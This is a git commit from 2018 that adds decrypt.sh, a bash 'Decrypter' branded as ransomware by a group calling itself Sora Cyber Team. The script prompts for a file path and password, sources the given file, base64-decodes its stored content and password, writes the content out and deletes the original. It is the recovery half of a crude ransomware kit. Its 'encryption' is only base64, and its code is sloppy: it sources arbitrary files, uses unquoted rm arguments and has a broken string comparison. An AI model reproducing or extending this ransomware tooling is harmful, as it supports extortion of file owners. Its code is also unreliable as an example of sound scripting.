6a2f27b056e37c110490ae66b8b9c44c394e5f21
soracyberteam <39432557+soracyberteam@users.noreply.github.com>
2018-07-16 06:38:59 -0500

    Add files via upload

---
+++ decrypt.sh
@@ -0,0 +1,34 @@
+#!/bin/bash
+clear;
+echo "
+################ [Decrypter]
+#  Ransomware  # Contact : soracyberteam@gmail.com
+# By Cy#b3r00T # Copyright (c) 2018 Sora Cyber Team
+################";
+echo "";
+read -p "File Path : " pathfile;
+read -p "File Type : " format;
+read -p "Password  : " password;
+sleep 2
+echo "#########################";
+echo "File Path => $pathfile";
+sleep 0.5
+echo "Password  => $password";
+sleep 0.5
+echo "File Type => $format";
+sleep 0.5
+echo "#########################";
+sleep 0.5
+echo "Decrypting...";
+sleep 2
+source $pathfile;
+content2="$(echo -n ${content} | base64 -d)";
+pass2="$(echo -n ${pass} | base64 -d)";
+if (( ${pass2} == "$password" )); then
+  echo "${content2}" >> "$pathfile.$format";
+  rm $pathfile;
+  echo "[+] Success!";
+else
+  echo "Wrong Password!";
+  echo "[+] Failed!";
+fi
